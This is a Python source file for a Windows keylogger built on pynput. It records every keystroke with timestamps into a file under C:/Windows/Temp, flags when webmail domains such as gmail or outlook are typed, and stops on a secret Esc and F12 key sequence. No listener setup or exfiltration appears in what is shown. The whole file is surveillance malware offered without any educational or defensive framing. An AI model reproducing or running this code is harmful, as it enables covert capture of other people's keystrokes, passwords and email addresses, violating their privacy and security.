from pynput import keyboard
import sys
from datetime import datetime

def pulse(key):
    none = None
    specialkey = {keyboard.Key.space: " ", keyboard.Key.backspace: " -Backspace- ", keyboard.Key.enter: " -Enter- ",
                  keyboard.Key.shift: " -Shift- ", keyboard.Key.up: " -Up- ", keyboard.Key.down: " -Down- ",
                  keyboard.Key.right: " -Right- ", keyboard.Key.left: " -Left- ", keyboard.Key.ctrl: " -ctrl- ",
                  keyboard.Key.caps_lock: " -Mayus- ", keyboard.Key.shift_r: " -Shift- ",
                  keyboard.Key.ctrl_r: " -ctrl- ", keyboard.Key.ctrl_l: " -ctrl- ", keyboard.Key.esc: " -esc- ",
                  keyboard.Key.f12: " -f12- ", keyboard.Key.alt_r: " -alt- ", keyboard.Key.alt_l: " -alt- ",
                  keyboard.Key.cmd: " -win- "}

    numpad = {'<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7',
              '<104>': '8', '<105>': '9', '<96>': '0'}

    try:
        with open('C:/Windows/Temp/INGSOC/log.txt', "r") as file:
            keylines = file.readlines()
            file.close()

        if key.char != none:
            keylines.extend(key.char + " - " + datetime.now().strftime("%H:%M:%S") + '\n')
        else:
            keylines.extend(numpad[str(key)] + '\n')

        with open('C:/Windows/Temp/INGSOC/log.txt', 'w') as file:
            file.writelines(keylines)
            file.close()
    except AttributeError:
        if key in specialkey:

            with open('C:/Windows/Temp/INGSOC/log.txt', "r") as file:
                keylines = file.readlines()
                file.close()

            keylines.extend(specialkey[key] + '\n')

            with open('C:/Windows/Temp/INGSOC/log.txt', 'w') as file:
                file.writelines(keylines)
                file.close()
        else:
            pass

    finally:
        pass

    at()
    on_close()

def mail_finder(key):
    chars = ('j', 'a', 'l', 'g', 'm', 'i', 'c', 'o', 'k', 'u', 't', 'n', 'y', 'h', '.')
    try:
        if key.char in chars:
            with open('C:/Windows/Temp/INGSOC/mail.txt', 'r') as file:
                mails = file.readlines()
                file.close()
            mails.insert(0, key.char + '\n')
            with open('C:/Windows/Temp/INGSOC/mail.txt', 'w+') as file:
                file.writelines(mails)
                file.close()
    except AttributeError:
        if key == keyboard.Key.space:
            with open('C:/Windows/Temp/INGSOC/mail.txt', 'r') as file:
                mails = file.readlines()
                file.close()
            mails.insert(0, ' \n')
            with open('C:/Windows/Temp/INGSOC/mail.txt', 'w+') as file:
                file.writelines(mails)
                file.close()
        else:
            pass

    with open('C:/Windows/Temp/INGSOC/mail.txt', 'r') as file:
        logs = file.readlines()
        file.close()

    with open('C:/Windows/Temp/INGSOC/mail.txt', 'w+') as file:
        line = ''
        if logs[0:9] == ['m\n', 'o\n', 'c\n', '.\n', 'l\n', 'i\n', 'a\n', 'm\n', 'g\n']:
            line = "gmail at " + datetime.now().strftime("%H:%M:%S") + '\n'

        elif logs[0:11] == ['m\n', 'o\n', 'c\n', '.\n', 'k\n', 'o\n', 'o\n', 'l\n', 't\n', 'u\n', 'o\n']:
            line = "outlook mail at " + datetime.now().strftime("%H:%M:%S") + '\n'

        elif logs[0:11] == ['m\n', 'o\n', 'c\n', '.\n', 'l\n', 'i\n', 'a\n', 'm\n', 't\n', 'o\n', 'h\n']:
            line = "hotmail at " + datetime.now().strftime("%H:%M:%S") + '\n'

        elif logs[0:9] == ['m\n', 'o\n', 'c\n', '.\n', 'o\n', 'o\n', 'h\n', 'a\n', 'y\n']:
            line = "yahoo mail at " + datetime.now().strftime("%H:%M:%S") + '\n'

        else:
            pass

        logs.append(line)
        file.writelines(logs)
        file.close()

def delete_chars():
    with open('C:/Windows/Temp/INGSOC/mail.txt', 'r') as file:
        logs = file.readlines()
        file.close()

    open('C:/Windows/Temp/INGSOC/mail.txt', 'w')

    with open('C:/Windows/Temp/INGSOC/mail.txt', 'w') as file:
        if logs[0] != '\t== Mails ==\n':
            for i in range(len(logs)):
                if logs[0] == '\t== Mails ==\n':
                    pass
                else:
                    del logs[0]
        file.writelines(logs)
        file.close()

def at():
    with open('C:/Windows/Temp/INGSOC/log.txt', 'r') as file:
        logs = file.readlines()
        file.close()
    if logs[-3:] == [' -alt- \n', '6\n', '4\n']:
        del logs[-3:]
        logs.append('@\n')
        with open('C:/Windows/Temp/INGSOC/log.txt', 'w+') as file:
            file.writelines(logs)
            file.close()

def on_close():
    with open('C:/Windows/Temp/INGSOC/log.txt', "r") as f:
        lista = f.readlines()
        f.close()

        if lista[-2:] == [' -esc- \n', ' -f12- \n']:
            delete_chars()
            sys.exit()
